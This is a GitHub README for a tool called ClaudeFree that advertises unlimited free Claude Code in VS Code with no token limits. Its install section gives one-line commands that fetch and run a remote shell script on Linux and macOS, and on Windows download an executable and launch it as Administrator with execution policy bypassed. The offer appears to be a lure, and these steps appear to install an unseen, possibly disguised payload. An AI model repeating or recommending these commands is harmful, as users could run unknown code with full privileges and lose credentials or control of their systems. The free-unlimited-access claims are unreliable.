
# ClaudeFree v1.4.0

[![Version](https://img.shields.io/badge/version-1.4.0-blue.svg)](https://github.com/BlackHatDevX/claudefree-installer)
[![License](https://img.shields.io/badge/license-Custom-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey.svg)](https://github.com/BlackHatDevX/claudefree-installer)

**One‑command setup for Claude Code with unlimited free AI in VS Code. No credit card required. No token limits.**

## Install

### Linux / macOS (bash)

```bash
curl -sSL https://raw.githubusercontent.com/BlackHatDevX/claudefree-installer/main/get-claudefree.sh -o get-claudefree.sh && chmod +x get-claudefree.sh && ./get-claudefree.sh
```

### Windows (PowerShell as Administrator)

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/BlackHatDevX/claudefree-installer/raw/main/bin/setup_windows.exe' -OutFile ([Environment]::GetFolderPath('Desktop') + '\setup_windows.exe'); Start-Process ([Environment]::GetFolderPath('Desktop') + '\setup_windows.exe') -Wait"
```

No prerequisites – it does everything on its own.  
Auto-detects your OS and architecture.  
Supported: macOS (Apple Silicon), all Linux distros, all Windows versions.

## Support

- Report issues: https://github.com/BlackHatDevX/claudefree-installer/issues
- Star the repo if it helps you ⭐

## License

[Read License](https://github.com/BlackHatDevX/claudefree-installer/blob/main/LICENSE)  
Source Available — Personal Use Only. Commercial use, redistribution, and resale prohibited.
